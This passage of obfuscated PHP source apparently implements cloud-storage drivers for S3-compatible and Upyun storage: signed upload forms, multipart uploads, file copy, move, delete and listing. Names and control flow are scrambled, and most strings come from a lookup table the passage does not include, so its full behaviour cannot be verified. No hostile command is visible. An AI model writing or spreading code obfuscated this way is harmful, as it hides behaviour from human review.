ºÃ); for ($DÕĞ—’×ˆù = 0; $DÕĞ—’×ˆù < count($F°¶Æõ¹Ò”); $DÕĞ—’×ˆù++) { $Bäã‰³É” = $F°¶Æõ¹Ò”[$DÕĞ—’×ˆù]; if ($Bäã‰³É”[$Cï×ò›ë‚¡[1743]] && $Bäã‰³É”[$Cï×ò›ë‚¡[1744]] > 1) { continue; } if (defined($Cï×ò›ë‚¡[1745]) && GLOBAL_LOG_HOOK) { write_log($aá·á‚âÀ† . $Cï×ò›ë‚¡[1746] . $Bäã‰³É”[$Cï×ò›ë‚¡[1742]], $Cï×ò›ë‚¡[1747]); } self::$events[$aá·á‚âÀ†][$DÕĞ—’×ˆù][$Cï×ò›ë‚¡[1744]] = $Bäã‰³É”[$Cï×ò›ë‚¡[1744]] + 1; $bÄ”—Ë©é– = self::apply($Bäã‰³É”[$Cï×ò›ë‚¡[1742]], $B–‚Ë ºÃ); if (defined($Cï×ò›ë‚¡[1745]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Cï×ò›ë‚¡[1747]); if ($Bäã‰³É”[$Cï×ò›ë‚¡[1744]] == 200) { $B‘›æ‹èƒğ = is_array($Bäã‰³É”[$Cï×ò›ë‚¡[1742]]) ? json_encode_force($Bäã‰³É”[$Cï×ò›ë‚¡[1742]]) : $Bäã‰³É”[$Cï×ò›ë‚¡[1742]]; write_log($Cï×ò›ë‚¡[1748] . $aá·á‚âÀ† . $Cï×ò›ë‚¡[1749] . $B‘›æ‹èƒğ, $Cï×ò›ë‚¡[1750]); } } $dÄ½—ïù   = is_null($bÄ”—Ë©é–) ? $dÄ½—ïù   : $bÄ”—Ë©é–; } goto cÉù‡ˆ×†‡; AŸõ›Ÿ¾ƒ›: if (!isset($f–“ùÁ‹‰•[$aá·á‚âÀ†])) { return $dÄ½—ïù  ; } $F°¶Æõ¹Ò” = $f–“ùÁ‹‰•[$aá·á‚âÀ†]; if (!is_array($F°¶Æõ¹Ò”) || count($F°¶Æõ¹Ò”) == 0) { return $dÄ½—ïù  ; } goto A¶¬”©ƒÚ; cÉù‡ˆ×†‡: return $dÄ½—ïù  ; goto aƒƒÓ§½å; EÌ¥£î›Ò: $Cï×ò›ë‚¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f–“ùÁ‹‰• = self::$events; $dÄ½—ïù   = !1; goto AŸõ›Ÿ¾ƒ›; aƒƒÓ§½å: } } goto C¥ñŒ†ŠóÍ; D¹®³†™ÊÌ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($f‚³“ÏËİ) { parent::__construct($f‚³“ÏËİ); } public function uploadFormData($F»Ê¿½Ÿ, $FÉ÷‘…ÃŸİ = 3600) { goto ašÓõÙÇŞ; C·ïÎù¾åÅ: $D°Ëõ¢Ä™ï = array($A‹ã‡†”¼ø[211] => $A‹ã‡†”¼ø[43], $A‹ã‡†”¼ø[1137] => $A‹ã‡†”¼ø[43], $A‹ã‡†”¼ø[1095] => $B„ôãâ¥Í, $A‹ã‡†”¼ø[1099] => $A„ÔñÃ±Áª, $A‹ã‡†”¼ø[1103] => $a¡Ç¯ŸÅï¿, $A‹ã‡†”¼ø[1138] => $bÍ¡¨¿¸‹˜, $A‹ã‡†”¼ø[1139] => $Fõ»ô¦Íá­, $A‹ã‡†”¼ø[1140] => $EÇ­ïªíæ, $A‹ã‡†”¼ø[1141] => $fíáˆãƒ‡Æ, $A‹ã‡†”¼ø[1142] => $BÜ„˜²¾áÛ, $A‹ã‡†”¼ø[181] => $this->getHost()); return $D°Ëõ¢Ä™ï; goto fò®ŠãºùÓ; F‹îù‚…ï‡: $C’§Ì—‹Œ“ = $A‹ã‡†”¼ø[71]; $EÇ­ïªíæ = gmdate($A‹ã‡†”¼ø[1126]); $bƒ°Øå†Öº = gmdate($A‹ã‡†”¼ø[685]); goto D¿Æ«öìê; E½„Ñ‡²‚ô: $a¡Ç¯ŸÅï¿ = base64_encode(json_encode($a‹¥´§Ï¶Ó)); $A¦÷ææÒ´ = hash_hmac($A‹ã‡†”¼ø[1135], $bƒ°Øå†Öº, $A‹ã‡†”¼ø[1136] . $this->secret, !0); $EÆ¬‹æ‘î­ = hash_hmac($A‹ã‡†”¼ø[1135], $this->region, $A¦÷ææÒ´, !0); goto b™‰‹÷­å; D¿Æ«öìê: $Eå¶·Çï˜â = $A‹ã‡†”¼ø[1127]; $fíáˆãƒ‡Æ = $FÉ÷‘…ÃŸİ . $A‹ã‡†”¼ø[43]; $A„ÔñÃ±Áª = $A‹ã‡†”¼ø[1091]; goto Bê©­’ò¥ñ; Bê©­’ò¥ñ: $Eİá™‰¹±Ş = array($this->accessKey, $bƒ°Øå†Öº, $this->region, $C’§Ì—‹Œ“, $Eå¶·Çï˜â); $bÍ¡¨¿¸‹˜ = implode($A‹ã‡†”¼ø[18], $Eİá™‰¹±Ş); $a‹¥´§Ï¶Ó = array($A‹ã‡†”¼ø[1093] => gmdate($A‹ã‡†”¼ø[1092], strtotime($A‹ã‡†”¼ø[1128])), $A‹ã‡†”¼ø[1094] => array(array($A‹ã‡†”¼ø[1096] => $this->bucket), array($A‹ã‡†”¼ø[1095] => $B„ôãâ¥Í), array($A‹ã‡†”¼ø[1097], $A‹ã‡†”¼ø[1098], $A‹ã‡†”¼ø[43]), array($A‹ã‡†”¼ø[1097], $A‹ã‡†”¼ø[1129], $A‹ã‡†”¼ø[43]), array($A‹ã‡†”¼ø[1097], $A‹ã‡†”¼ø[1130], $A‹ã‡†”¼ø[43]), array($A‹ã‡†”¼ø[1099] => $A„ÔñÃ±Áª), array($A‹ã‡†”¼ø[1131] => $bÍ¡¨¿¸‹˜), array($A‹ã‡†”¼ø[1132] => $Fõ»ô¦Íá­), array($A‹ã‡†”¼ø[1133] => $EÇ­ïªíæ), array($A‹ã‡†”¼ø[1134] => $fíáˆãƒ‡Æ))); goto E½„Ñ‡²‚ô; ašÓõÙÇŞ: $A‹ã‡†”¼ø =& $_SERVER[¹÷ˆ§éÒ°ú]; $B„ôãâ¥Í = $A‹ã‡†”¼ø[197]; $Fõ»ô¦Íá­ = $A‹ã‡†”¼ø[1125]; goto F‹îù‚…ï‡; b™‰‹÷­å: $bé’¦¶¸²º = hash_hmac($A‹ã‡†”¼ø[1135], $C’§Ì—‹Œ“, $EÆ¬‹æ‘î­, !0); $e•Í°ÍØ•Š = hash_hmac($A‹ã‡†”¼ø[1135], $Eå¶·Çï˜â, $bé’¦¶¸²º, !0); $BÜ„˜²¾áÛ = hash_hmac($A‹ã‡†”¼ø[1135], $a¡Ç¯ŸÅï¿, $e•Í°ÍØ•Š); goto C·ïÎù¾åÅ; fò®ŠãºùÓ: } public function multiUploadFormData($fÔ¡¶âÂ•, $eôù‡Ş¶”§ = 3600) { $b¿Í„ô…ß =& $_SERVER[¹÷ˆ§éÒ°ú]; $C´º„öÑ„ = gmdate($b¿Í„ô…ß[1221]); $eì£Ó½ãÊ¯ = array(); $e‘»ò¬ò ‘ = $this->client->getUploadId($this->bucket, $fÔ¡¶âÂ•, $eì£Ó½ãÊ¯); if (!$e‘»ò¬ò ‘) { return !1; } return array($b¿Í„ô…ß[221] => $e‘»ò¬ò ‘, $b¿Í„ô…ß[181] => $this->getHost() . $b¿Í„ô…ß[18] . $this->pathEncode($fÔ¡¶âÂ•), $b¿Í„ô…ß[222] => $C´º„öÑ„, $b¿Í„ô…ß[101] => $fÔ¡¶âÂ•); } public function multiUploadAuthData($d˜‡˜ŠÖ£°, $dïËç§¶‰¿ = array()) { goto C‰ÏÃïÛºë; c…¢²Ó‰ß¡: $C®ï¿ğ‘øÓ = $F©µÔ¤Ÿœ¥[226]; $EİîÉëèæÁ = $F©µÔ¤Ÿœ¥[18] . $this->pathEncode($AÂÕÕî»¦ ) . $Fƒ³±éÔî; $C·­« ³¬ = $this->client->__getSignatureV4($f¢ ÏŠÏ÷, $DÉŸİ›Œ˜å, $C®ï¿ğ‘øÓ, $EİîÉëèæÁ); goto f¥šÆºá; aøêëêá‰‚: unset($dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[101]]); if (isset($dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[223]])) { return $this->listUploadParts($AÂÕÕî»¦ , $dïËç§¶‰¿); } $f¢ ÏŠÏ÷ = array(); goto E“Ç²ô; C‰ÏÃïÛºë: $F©µÔ¤Ÿœ¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fƒ³±éÔî = isset($dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[172]]) ? $dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[172]] : $F©µÔ¤Ÿœ¥[43]; $AÂÕÕî»¦  = $dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[101]]; goto aøêëêá‰‚; f¥šÆºá: if (strpos($Fƒ³±éÔî, $F©µÔ¤Ÿœ¥[225]) === 0) { if (isset($f¢ ÏŠÏ÷[$F©µÔ¤Ÿœ¥[1223]])) { $FöÄÈóˆ ’ = $f¢ ÏŠÏ÷[$F©µÔ¤Ÿœ¥[1223]]; } else { if (isset($C·­« ³¬[$F©µÔ¤Ÿœ¥[1223]])) { $FöÄÈóˆ ’ = $C·­« ³¬[$F©µÔ¤Ÿœ¥[1223]]; } else { $FöÄÈóˆ ’ = hash($F©µÔ¤Ÿœ¥[1135], $F©µÔ¤Ÿœ¥[43]); } } return array($F©µÔ¤Ÿœ¥[231] => $C·­« ³¬[$F©µÔ¤Ÿœ¥[231]], $F©µÔ¤Ÿœ¥[1223] => $FöÄÈóˆ ’, $F©µÔ¤Ÿœ¥[222] => $C·­« ³¬[$F©µÔ¤Ÿœ¥[1226]]); } return $C·­« ³¬[$F©µÔ¤Ÿœ¥[231]]; goto E¯¯ÏÓİì; E“Ç²ô: if (isset($dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[1222]])) { $f¢ ÏŠÏ÷[$F©µÔ¤Ÿœ¥[1223]] = $dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[1222]]; } $c±–æí³Èµ = explode($F©µÔ¤Ÿœ¥[183], $this->getHost()); $DÉŸİ›Œ˜å = array($F©µÔ¤Ÿœ¥[1224] => $c±–æí³Èµ[1], $F©µÔ¤Ÿœ¥[1225] => $F©µÔ¤Ÿœ¥[43], $F©µÔ¤Ÿœ¥[211] => $F©µÔ¤Ÿœ¥[128], $F©µÔ¤Ÿœ¥[1137] => $dïËç§¶‰¿[$F©µÔ¤Ÿœ¥[89]]); goto c…¢²Ó‰ß¡; E¯¯ÏÓİì: } public function listUploadParts($Få•“ŸÀ¾, $A¶²©›ğçì = array()) { goto AÜ„‡¾†š; BÅä‘Í¤ÊË: $eÜá°­ºÌØ = array($BçëÁØõß[1224] => $E©œ¿‰‰ø“[1], $BçëÁØõß[211] => $BçëÁØõß[128], $BçëÁØõß[1137] => strlen($eÇˆºÛŠùá)); $Aˆ‚…©Ó° = $BçëÁØõß[224]; $CĞê«æë ¤ = $BçëÁØõß[18] . $this->pathEncode($Få•“ŸÀ¾) . $A¶²©›ğçì[$BçëÁØõß[172]]; goto b·»Õ°©ç£; b·»Õ°©ç£: $E¬ùÇ‘ÊÅé = $this->client->__getSignatureV4($C‰ßŒö¨ˆÌ, $eÜá°­ºÌØ, $Aˆ‚…©Ó°, $CĞê«æë ¤, $eÇˆºÛŠùá); return array($BçëÁØõß[231] => $E¬ùÇ‘ÊÅé[$BçëÁØõß[231]], $BçëÁØõß[222] => $E¬ùÇ‘ÊÅé[$BçëÁØõß[1226]], $BçëÁØõß[233] => $C›‚×î„­–, $BçëÁØõß[1223] => $E¬ùÇ‘ÊÅé[$BçëÁØõß[1223]]); goto aÌ•Ì éÄ¿; B¼ÃŞ£Ö: if (!$C›‚×î„­–) { return !1; } $eÇˆºÛŠùá = $BçëÁØõß[1227]; foreach ($C›‚×î„­– as $Dñ’±Õ²¹â) { $eÇˆºÛŠùá .= $BçëÁØõß[1228] . "\x3c\x50\x61\162\x74\116\165\x6d\142\145\162\x3e{$Dñ’±Õ²¹â[$BçëÁØõß[1179]]}\74\x2f\x50\141\162\164\116\165\x6d\x62\145\x72\76\12" . "\x3c\105\124\x61\147\x3e{$Dñ’±Õ²¹â[$BçëÁØõß[1180]]}\x3c\x2f\x45\124\x61\x67\76\12" . $BçëÁØõß[1229]; } goto bŠ•¥Â›ÆŒ; bŠ•¥Â›ÆŒ: $eÇˆºÛŠùá .= $BçëÁØõß[1230]; $C‰ßŒö¨ˆÌ = array(); $E©œ¿‰‰ø“ = explode($BçëÁØõß[183], $this->getHost()); goto BÅä‘Í¤ÊË; AÜ„‡¾†š: $BçëÁØõß =& $_SERVER[¹÷ˆ§éÒ°ú]; $d”‡ÍÖÕ† = str_replace($BçëÁØõß[232], $BçëÁØõß[43], $A¶²©›ğçì[$BçëÁØõß[172]]); $C›‚×î„­– = $this->client->listParts($this->bucket, $Få•“ŸÀ¾, $d”‡ÍÖÕ†); goto B¼ÃŞ£Ö; aÌ•Ì éÄ¿: } public function link($d‚ô½Êç©¤, $E½¼é†‰‘… = array()) { return parent::link($d‚ô½Êç©¤, $E½¼é†‰‘…); } public function fileOut($D‡½ÄÛ‡àß, $eó¤¶ĞÓ«¯ = false, $E…ç±òä¤ = false, $F“º‹Ôğ² = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹÷ˆ§éÒ°ú][1231])) { return parent::fileOutServer($D‡½ÄÛ‡àß, $eó¤¶ĞÓ«¯, $E…ç±òä¤, $F“º‹Ôğ²); } parent::fileOut($D‡½ÄÛ‡àß, $eó¤¶ĞÓ«¯, $E…ç±òä¤, $F“º‹Ôğ²); } public function fileOutImage($dòßë–×«Â, $fÉ…ŠòÔˆË = 250) { if (strstr($this->endpoint, $_SERVER[¹÷ˆ§éÒ°ú][1231])) { return parent::fileOutImageServer($dòßë–×«Â, $fÉ…ŠòÔˆË); } parent::fileOutImage($dòßë–×«Â, $fÉ…ŠòÔˆË); } public function fileOutLink($d Ôç³§Œà) { $FÑâš«™‚Ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (substr($d Ôç³§Œà, 0, 7) == $FÑâš«™‚Ğ[1106]) { $d Ôç³§Œà = $FÑâš«™‚Ğ[1107] . substr($d Ôç³§Œà, 7); } header($FÑâš«™‚Ğ[168] . $d Ôç³§Œà); die; } public function getHost() { $fà—Ú¸Ù›ß =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¹½†™çÇ = str_rtrim(parent::getHost(), $fà—Ú¸Ù›ß[18] . $this->bucket); $B¹½†™çÇ = explode($fà—Ú¸Ù›ß[183], $B¹½†™çÇ); return $B¹½†™çÇ[0] . $fà—Ú¸Ù›ß[183] . $this->bucket . $fà—Ú¸Ù›ß[103] . $B¹½†™çÇ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($CÇÂà¤ƒ×â, $e—ĞçÓÎ = 0) { parent::__construct(); $this->source = $CÇÂà¤ƒ×â; $this->sourceSize = $e—ĞçÓÎ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($fÇ®‹ÒëöÖ = false) { return $this->sourceSize; } public function getContent($f˜·¦¶óª = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Fì‚˜ó°ŞÔ = ftell($this->source); $CöôŒ»§º = @fread($this->source, $this->sourceSize); fseek($this->source, $Fì‚˜ó°ŞÔ); return $CöôŒ»§º; } } public function fileSubstr($Dç‹ñÌ³İ = false, $A¢‘²ïÜ¶› = 0, $bŠ–ññî = 0) { if (!$bŠ–ññî) { $bŠ–ññî = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $A¢‘²ïÜ¶›, $bŠ–ññî); } if ($this->sourceType == self::TYPE_FILE) { $aäÍÜø»Õ = ftell($this->source); fseek($this->source, $aäÍÜø»Õ + $A¢‘²ïÜ¶›); $a¯âø¾èƒ = @fread($this->source, $bŠ–ññî); fseek($this->source, $aäÍÜø»Õ); return $a¯âø¾èƒ; } } public function hashMd5($C™«Ì°òÏø = false) { return md5($this->getContent()); } public static function hash($dŒËÑŠÀ¥, $Bğİ¼’ì¿Æ = 0) { $Cç¹ä©Óº = new PathDriverStream($dŒËÑŠÀ¥, $Bğİ¼’ì¿Æ); return $Cç¹ä©Óº->hashSimple($dŒËÑŠÀ¥); } public static function md5($bİÚô‡àªš, $Aª¨…ƒ×†Ë = 0) { $CŒ»¬øÔº‹ = new PathDriverStream($bİÚô‡àªš, $Aª¨…ƒ×†Ë); return $CŒ»¬øÔº‹->hashMd5($bİÚô‡àªš); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\x2f\x2f\166\60\x2e\141\160\x69\56\x75\x70\171\165\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($CãÍÖî¨µ¿) { parent::__construct(); $this->_init($CãÍÖî¨µ¿); } public function _init($BŒºÀå­ƒİ) { foreach ($BŒºÀå­ƒİ as $d‚í›…ß” => $F¼È«Û¾ñ·) { if (isset($this->{$d‚í›…ß”})) { $this->{$d‚í›…ß”} = $F¼È«Û¾ñ·; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¹÷ˆ§éÒ°ú][1232], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c‡ÍÏœùö¤, $b‚ÍŠ¡À = "\107\x45\x54") { $EÄãŠòØ…¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A³¶Õä¯îç = gmdate($EÄãŠòØ…¸[1196]); $b›ÍæßÑˆõ = base64_encode(hash_hmac($EÄãŠòØ…¸[1233], "{$b‚ÍŠ¡À}\46{$c‡ÍÏœùö¤}\46{$A³¶Õä¯îç}", md5("{$this->userpass}"), !0)); $CÀî×ËÑÎˆ = array("\x41\165\x74\150\157\x72\x69\172\x61\164\151\x6f\x6e\x3a\x55\x50\x59\x55\x4e\x20{$this->username}\x3a{$b›ÍæßÑˆõ}", "\104\141\x74\145\72{$A³¶Õä¯îç}"); return $CÀî×ËÑÎˆ; } public function ussRequest($e¦ÜÓ³Œ, $bÁ™ÄŒ¼© = "\x47\x45\x54", $DÈ¢ƒ¶…–— = false, $d¸’ ¥Š‹§ = false, $D„ÔöÂÖØ© = false) { goto f“ï÷”À÷À; f“ï÷”À÷À: $CÍ «¸–êÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e¦ÜÓ³Œ = trim($e¦ÜÓ³Œ, $CÍ «¸–êÅ[18]); $cóÏôŸéŒ = "\57{$this->bucket}\57{$e¦ÜÓ³Œ}"; goto Cë’â–í÷‹; E³º·æó”: if (!$aƒÇ­òâ¯) { return array($CÍ «¸–êÅ[1023] => !1, $CÍ «¸–êÅ[1025] => $CÍ «¸–êÅ[1234]); } if (strtolower($bÁ™ÄŒ¼©) == $CÍ «¸–êÅ[196] || in_array($aƒÇ­òâ¯[$CÍ «¸–êÅ[1023]], array($CÍ «¸–êÅ[1091], $CÍ «¸–êÅ[1235]))) { $DÈ¢ƒ¶…–— = $aƒÇ­òâ¯[$CÍ «¸–êÅ[1236]]; } else { $DÈ¢ƒ¶…–— = json_decode($aƒÇ­òâ¯[$CÍ «¸–êÅ[1025]], !0); if (!$DÈ¢ƒ¶…–—) { $DÈ¢ƒ¶…–— = $aƒÇ­òâ¯[$CÍ «¸–êÅ[1025]]; } else { if (!$aƒÇ­òâ¯[$CÍ «¸–êÅ[684]] && isset($DÈ¢ƒ¶…–—[$CÍ «¸–êÅ[1237]])) { $DÈ¢ƒ¶…–— = $DÈ¢ƒ¶…–—[$CÍ «¸–êÅ[1237]]; } } } return array($CÍ «¸–êÅ[1023] => $aƒÇ­òâ¯[$CÍ «¸–êÅ[684]], $CÍ «¸–êÅ[1025] => $DÈ¢ƒ¶…–—); goto BöÏÙ•‹½Ù; Cë’â–í÷‹: $fñ²´‘Û’ô = $this->ussHeaders($cóÏôŸéŒ, $bÁ™ÄŒ¼©); if ($d¸’ ¥Š‹§) { $fñ²´‘Û’ô = array_merge($fñ²´‘Û’ô, $d¸’ ¥Š‹§); } $aƒÇ­òâ¯ = url_request($this->endpoint . $cóÏôŸéŒ, $bÁ™ÄŒ¼©, $DÈ¢ƒ¶…–—, $fñ²´‘Û’ô, $D„ÔöÂÖØ©); goto E³º·æó”; BöÏÙ•‹½Ù: } public function mkfile($E‚‹‡á™, $FÅëÍ« = '', $c«õ™õèÒ = REPEAT_RENAME) { if ($this->setContent($E‚‹‡á™, $FÅëÍ«)) { return $this->getPathOuter($E‚‹‡á™); } return !1; } public function mkdir($e £°Ç’Öõ, $B†ÓÕ‡§ê = REPEAT_SKIP) { $A…š†ä±¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BĞ£ß±À± = trim($e £°Ç’Öõ, $A…š†ä±¬[18]); if ($this->_isFolder($BĞ£ß±À±)) { return $this->getPathOuter($BĞ£ß±À±); } $A´…Áëä = array($A…š†ä±¬[1238]); $B Ñè•Œ‚¦ = $this->ussRequest($BĞ£ß±À±, $A…š†ä±¬[224], !1, $A´…Áëä); return $B Ñè•Œ‚¦[$A…š†ä±¬[1023]] ? $this->getPathOuter($BĞ£ß±À±) : !1; } public function copyFile($cºá×“ô—¹, $FÍÒÜ©éøÑ) { $b÷›‡²Ÿê¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÏÆàÙ¥ì = array($b÷›‡²Ÿê¦[1239] . "\57{$this->bucket}\x2f{$cºá×“ô—¹}", $b÷›‡²Ÿê¦[1240]); $C„‡Òö“¨ï = $this->ussRequest($FÍÒÜ©éøÑ, $b÷›‡²Ÿê¦[226], !1, $aÏÆàÙ¥ì); return $C„‡Òö“¨ï[$b÷›‡²Ÿê¦[1023]] ? !0 : $this->getPathOuter($FÍÒÜ©éøÑ); } public function moveFile($c‹šœÕôƒ¯, $bºº—È™ÉÚ) { $BÖ”õæñª =& $_SERVER[¹÷ˆ§éÒ°ú]; $aö‹Œ…ˆÀŒ = array($BÖ”õæñª[1241] . "\57{$this->bucket}\x2f{$c‹šœÕôƒ¯}", $BÖ”õæñª[1240]); $bÄµ‹ìÈ° = $this->ussRequest($bºº—È™ÉÚ, $BÖ”õæñª[226], !1, $aö‹Œ…ˆÀŒ); return $bÄµ‹ìÈ°[$BÖ”õæñª[1023]] ? !0 : $this->getPathOuter($bºº—È™ÉÚ); } public function delFile($Bİ÷°İí®) { $eê÷ÄÎĞ» =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÛÅøÖ­†Ş = $this->ussRequest($Bİ÷°İí®, $eê÷ÄÎĞ»[1242]); return $bÛÅøÖ­†Ş[$eê÷ÄÎĞ»[1023]] ? !0 : !1; } public function delFolder($D­Û®Şƒ„ë) { $F¦ø›ÉÆğÛ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bç‹´Ïêï© = $this->listAll($D­Û®Şƒ„ë); krsort($bç‹´Ïêï©); foreach ($bç‹´Ïêï© as $Dõâ¿›©Øª) { $this->ussRequest($Dõâ¿›©Øª[$F¦ø›ÉÆğÛ[87]], $F¦ø›ÉÆğÛ[1242]); } return $this->ussRequest($D­Û®Şƒ„ë, $F¦ø›ÉÆğÛ[1242]); } public function rename($Dî¬ğò˜ô¸, $A¸Á¥†±ó‚) { if ($this->isFile($Dî¬ğò˜ô¸)) { $A¸Á¥†±ó‚ = get_path_father($Dî¬ğò˜ô¸) . $A¸Á¥†±ó‚; return $this->moveFile($Dî¬ğò˜ô¸, $A¸Á¥†±ó‚); } return $this->renameObject($Dî¬ğò˜ô¸, $A¸Á¥†±ó‚); } public function fileInfo($Aó‡Ë¼††°, $fÖ¦ƒøøÄÉ = false, $c½‡’šØ’Õ = array()) { $bŞ‘›ÅÑ± =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($fÖ¦ƒøøÄÉ) { return array($bŞ‘›ÅÑ±[38] => $this->pathThis($Aó‡Ë¼††°), $bŞ‘›ÅÑ±[87] => $this->getPathOuter($bŞ‘›ÅÑ±[18] . $Aó‡Ë¼††°), $bŞ‘›ÅÑ±[39] => $bŞ‘›ÅÑ±[179], $bŞ‘›ÅÑ±[89] => isset($c½‡’šØ’Õ[$bŞ‘›ÅÑ±[336]]) ? $c½‡’šØ’Õ[$bŞ‘›ÅÑ±[336]] : 0, $bŞ‘›ÅÑ±[172] => $this->ext($Aó‡Ë¼††°)); } $FÁëŞ½Üà = array($bŞ‘›ÅÑ±[38] => $this->pathThis($Aó‡Ë¼††°), $bŞ‘›ÅÑ±[87] => $this->getPathOuter($bŞ‘›ÅÑ±[18] . $Aó‡Ë¼††°), $bŞ‘›ÅÑ±[39] => $bŞ‘›ÅÑ±[179], $bŞ‘›ÅÑ±[199] => 0, $bŞ‘›ÅÑ±[119] => isset($Dç£¿Ò½ƒ[$bŞ‘›ÅÑ±[1243]]) ? $Dç£¿Ò½ƒ[$bŞ‘›ÅÑ±[1243]] : 0, $bŞ‘›ÅÑ±[89] => isset($c½‡’šØ’Õ[$bŞ‘›ÅÑ±[336]]) ? $c½‡’šØ’Õ[$bŞ‘›ÅÑ±[336]] : 0, $bŞ‘›ÅÑ±[172] => $this->ext($Aó‡Ë¼††°), $bŞ‘›ÅÑ±[200] => !0, $bŞ‘›ÅÑ±[201] => !0); if (empty($c½‡’šØ’Õ)) { $c½‡’šØ’Õ = $this->objectMeta($Aó‡Ë¼††°); if (!$c½‡’šØ’Õ) { return $FÁëŞ½Üà; } $FÁëŞ½Üà[$bŞ‘›ÅÑ±[199]] = $c½‡’šØ’Õ[$bŞ‘›ÅÑ±[1244]]; $FÁëŞ½Üà[$bŞ‘›ÅÑ±[119]] = $c½‡’šØ’Õ[$bŞ‘›ÅÑ±[1245]]; $FÁëŞ½Üà[$bŞ‘›ÅÑ±[89]] = $c½‡’šØ’Õ[$bŞ‘›ÅÑ±[89]]; } return $FÁëŞ½Üà; } public function folderInfo($d³ø»Ö“‹ç, $eäùéÏ–ãƒ = false) { $aæáí’ğƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($eäùéÏ–ãƒ) { return array($aæáí’ğƒ[38] => $this->pathThis($d³ø»Ö“‹ç), $aæáí’ğƒ[87] => $this->getPathOuter($aæáí’ğƒ[18] . $d³ø»Ö“‹ç), $aæáí’ğƒ[39] => $aæáí’ğƒ[88]); } $a„Ù·ÁèÛ‚ = array($aæáí’ğƒ[38] => $this->pathThis($d³ø»Ö“‹ç), $aæáí’ğƒ[87] => $this->getPathOuter($aæáí’ğƒ[18] . $d³ø»Ö“‹ç), $aæáí’ğƒ[39] => $aæáí’ğƒ[88], $aæáí’ğƒ[199] => 0, $aæáí’ğƒ[119] => isset($D•çååÊƒµ[$aæáí’ğƒ[1243]]) ? $D•çååÊƒµ[$aæáí’ğƒ[1243]] : 0, $aæáí’ğƒ[1153] => !0, $aæáí’ğƒ[1154] => !0); if (empty($b±ÉÇì²¨)) { $b±ÉÇì²¨ = $this->objectMeta($d³ø»Ö“‹ç); if (!$b±ÉÇì²¨) { return $a„Ù·ÁèÛ‚; } $a„Ù·ÁèÛ‚[$aæáí’ğƒ[199]] = $b±ÉÇì²¨[$aæáí’ğƒ[1244]]; $a„Ù·ÁèÛ‚[$aæáí’ğƒ[119]] = $b±ÉÇì²¨[$aæáí’ğƒ[1245]]; } return $a„Ù·ÁèÛ‚; } private function fileList($dëÈÅ¥«ğ®, $dñ·…ƒ°áµ = 0, $aš´ƒâÌ¯ = 1000) { $C‹áÙ‰Ôòæ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aé’¢…“„‹ = array($C‹áÙ‰Ôòæ[1246], $C‹áÙ‰Ôòæ[1247] . $aš´ƒâÌ¯); if ($dñ·…ƒ°áµ) { $aé’¢…“„‹[] = $C‹áÙ‰Ôòæ[1248] . $dñ·…ƒ°áµ; } $b©Òó½”…¼ = $this->ussRequest($dëÈÅ¥«ğ®, $C‹áÙ‰Ôòæ[228], !1, $aé’¢…“„‹); return !$b©Òó½”…¼[$C‹áÙ‰Ôòæ[1023]] ? !1 : $b©Òó½”…¼[$C‹áÙ‰Ôòæ[1025]]; } public function listPath($eäØŸ±«º, $bé¾ÆºœÄ• = false) { goto F„ÉÓàÏ‚‚; F„ÉÓàÏ‚‚: $Fåô‡Á•¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c×“ÃµİÈœ = $Fåô‡Á•¨[43]; $EŠøÄ“½Ğ‹ = 1000; goto C§º†¸Şùç; Côå˜ù‡´ù: return array($Fåô‡Á•¨[86] => $Eˆ»¸³Ú¢, $Fåô‡Á•¨[85] => $fµ×Õ±ÈâÜ); goto dæÃ—Øï„; C§º†¸Şùç: $Eˆ»¸³Ú¢ = $fµ×Õ±ÈâÜ = array(); $Aó·™õ×Ç = rtrim($eäØŸ±«º, $Fåô‡Á•¨[18]) . $Fåô‡Á•¨[18]; while (!0) { $A’¢ø–Ùßç = $this->fileList($eäØŸ±«º, $c×“ÃµİÈœ, $EŠøÄ“½Ğ‹); if (!$A’¢ø–Ùßç) { return !1; } $c×“ÃµİÈœ = isset($A’¢ø–Ùßç[$Fåô‡Á•¨[1249]]) ? $A’¢ø–Ùßç[$Fåô‡Á•¨[1249]] : $Fåô‡Á•¨[43]; $A¬‹¯Œäº¿ = isset($A’¢ø–Ùßç[$Fåô‡Á•¨[1250]]) ? $A’¢ø–Ùßç[$Fåô‡Á•¨[1250]] : array(); foreach ($A¬‹¯Œäº¿ as $FéÂğ¥† ) { if 